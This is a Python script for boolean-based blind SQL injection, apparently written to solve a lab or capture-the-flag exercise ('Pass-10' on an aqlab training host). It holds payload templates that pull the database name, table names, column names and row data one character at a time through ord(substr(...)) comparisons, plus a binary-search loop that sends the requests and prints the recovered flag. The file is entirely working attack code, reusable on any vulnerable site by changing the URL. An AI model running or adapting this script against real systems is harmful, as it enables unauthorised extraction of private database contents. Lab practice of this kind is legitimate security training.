import time
from requests_html import AsyncHTMLSession, HTMLSession

url = 'http://inject2.lab.aqlab.cn:81/Pass-10/index.php?id=0'
flag_success = '有数据'

payload1_database_length = ' or length(database())={}'
payload_database = ' or ord(substr(database(),{},1))>{}'
payload_table = ' or ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}'
payload_column = ' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}'
payload_data = ' or ord( SUBSTR((select group_concat({}) from {}),{},1))>{}'

start_time = time.time()

session = HTMLSession()
proxies = {}


def go(title, payload):
    db = ''
    for i in range(1, 128):
        s = search(i, payload)
        if not 32 < ord(s) <= 128:
            break
        db += s
        print(f'{title} = ', db)


def search(index, payload):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        sql = url + payload.format(index, mid)
        res = session.get(sql)
        if flag_success in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

        if mid == 32:
            break
    return chr(mid)


if __name__ == '__main__':
    table_name = 'loflag'
    column_name = 'flaglo'

    # go('database', payload_database)  # 'kanwolongxia'
    # go('table', payload_table)  # 'loflag'
    # go('column', payload_column.format(table_name, '{}', '{}'))  # Id,flaglo
    go('data', payload_data.format(column_name, table_name, '{}', '{}'))
    print("--- %s seconds ---" % (time.time() - start_time))
